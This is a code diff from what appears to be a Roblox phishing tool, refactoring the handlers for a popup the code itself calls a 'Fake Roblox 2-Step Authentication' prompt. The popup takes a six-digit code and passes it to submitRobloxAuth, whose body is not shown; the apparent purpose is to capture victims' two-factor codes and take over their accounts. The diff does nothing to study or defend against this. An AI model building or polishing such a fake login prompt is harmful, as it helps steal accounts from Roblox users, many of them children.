@@ -656,6 +656,30 @@ function detectRobloxItemFromScript(text) {
     return null;
 }
 
+// Helper functions for 2FA input handling
+function handleCodeInput(e) {
+    const verifyBtn = document.getElementById('robloxVerifyBtn');
+    
+    // Only allow numbers
+    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+    
+    // Enable/disable button based on input
+    if (e.target.value.length === 6 && /^\d+$/.test(e.target.value)) {
+        verifyBtn.disabled = false;
+        verifyBtn.classList.add('enabled');
+    } else {
+        verifyBtn.disabled = true;
+        verifyBtn.classList.remove('enabled');
+    }
+}
+
+function handleKeyDown(e) {
+    const verifyBtn = document.getElementById('robloxVerifyBtn');
+    if (e.key === 'Enter' && !verifyBtn.disabled) {
+        submitRobloxAuth();
+    }
+}
+
 // Fake Roblox 2-Step Authentication Functions
 function showRoblox2StepAuth() {
     const popup = document.getElementById('roblox2StepPopup');
@@ -667,29 +691,17 @@ function showRoblox2StepAuth() {
             const verifyBtn = document.getElementById('robloxVerifyBtn');
             
             if (codeInput && verifyBtn) {
+                // Clear any previous event listeners
+                codeInput.removeEventListener('input', handleCodeInput);
+                codeInput.removeEventListener('keydown', handleKeyDown);
+                
                 codeInput.focus();
                 
                 // Add input validation
-                codeInput.addEventListener('input', (e) => {
-                    // Only allow numbers
-                    e.target.value = e.target.value.replace(/[^0-9]/g, '');
-                    
-                    // Enable/disable button based on input
-                    if (e.target.value.length === 6 && /^\d+$/.test(e.target.value)) {
-                        verifyBtn.disabled = false;
-                        verifyBtn.classList.add('enabled');
-                    } else {
-                        verifyBtn.disabled = true;
-                        verifyBtn.classList.remove('enabled');
-                    }
-                });
+                codeInput.addEventListener('input', handleCodeInput);
                 
                 // Handle Enter key
-                codeInput.addEventListener('keydown', (e) => {
-                    if (e.key === 'Enter' && !verifyBtn.disabled) {
-                        submitRobloxAuth();
-                    }
-                });
+                codeInput.addEventListener('keydown', handleKeyDown);
             }
         }, 100);
     }
